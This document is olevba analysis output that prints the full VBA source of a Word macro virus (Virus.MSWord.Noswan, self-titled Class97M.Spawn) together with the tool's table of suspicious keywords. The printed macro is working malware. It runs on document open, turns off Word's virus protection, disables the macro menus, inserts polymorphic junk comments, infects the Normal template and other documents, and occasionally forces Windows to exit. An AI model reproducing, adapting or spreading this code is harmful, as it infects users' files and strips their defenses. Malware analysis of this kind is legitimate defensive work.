olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noswan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Noswan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    ' =================================================
    '  LineZerØ Vx Team & Jack Twoflower präsentieren:
    '
    '     Class97M.Spawn
    ' =================================================
    
Sub Document_Open()
On Error Resume Next

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled

CommandBars("View").Controls("Symbolleisten").Enabled = False
CommandBars("Format").Controls("Formatvorlage...").Enabled = False
CommandBars("Tools").Controls("Makro").Enabled = False
CommandBars("Tools").Controls("Vorlagen und Add-Ins...").Enabled = False
CommandBars("Tools").Controls("Anpassen...").Enabled = False

Set Normal_ = NormalTemplate.VBProject.VBComponents.Item(1)
Set Active_ = ActiveDocument.VBProject.VBComponents.Item(1)

ActiveLines = Active_.CodeModule.CountOfLines
NormalLines = Normal_.CodeModule.CountOfLines

PolySize = Int(Rnd * 5)

For PolyMorphic = 1 To PolySize

    PolyString = ""
    PolyLines = Application.VBE.ActiveVBProject.VBComponents.Item(1).CodeModule.CountOfLines

    RndLine = Int(Rnd * PolyLines)
    StringSize = Int(Rnd * 39) + 1

    For SomeString = 1 To StringSize
        PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
    Next SomeString
    
    Application.VBE.ActiveVBProject.VBComponents.Item(1).CodeModule.InsertLines RndLine, "Rem " & PolyString

Next PolyMorphic

If NormalLines <> 0 Then NormalIns = True
If ActiveLines <> 0 Then ActiveIns = True

If NormalIns <> True Then
    Normal_.CodeModule.AddFromString _
    ("Sub Document_Close()" & vbCr & Active_.CodeModule.Lines(2, ActiveLines))
End If

If ActiveIns <> True Then
    Active_.CodeModule.AddFromString _
    ("Sub Document_Open()" & vbCr & Normal_.CodeModule.Lines(2, NormalLines))
    ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Int(Rnd * 31) + 1 Then Tasks.ExitWindows
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

